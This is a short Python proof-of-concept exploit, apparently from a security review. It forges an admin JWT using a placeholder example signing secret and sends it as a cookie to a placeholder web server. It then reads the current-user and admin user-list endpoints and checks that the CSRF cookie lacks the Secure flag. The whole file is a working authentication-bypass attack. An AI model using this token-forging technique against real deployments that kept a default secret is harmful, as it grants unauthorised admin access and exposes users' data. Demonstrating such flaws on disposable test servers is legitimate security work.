"""Public example key exploit, only against the disposable placeholder server."""

import json

import httpx
import jwt


if __name__ == "__main__":
    token = jwt.encode({"sub": "1", "exp": 4102444800},
                       "replace-with-a-random-secret-at-least-32-characters", algorithm="HS256")
    with httpx.Client(base_url="http://notes-review-final-917-placeholder:8000",
                      cookies={"access_token": token}) as client:
        me = client.get("/api/auth/me")
        admin = client.get("/api/admin/users")
        csrf = client.get("/api/auth/csrf")
        assert me.status_code == admin.status_code == 200
        assert me.json()["role"] == "admin"
        assert "secure" not in csrf.headers["set-cookie"].lower()
        print(json.dumps({"forged_admin_me": me.status_code,
                          "forged_admin_users": admin.status_code,
                          "production_csrf_secure": False}))
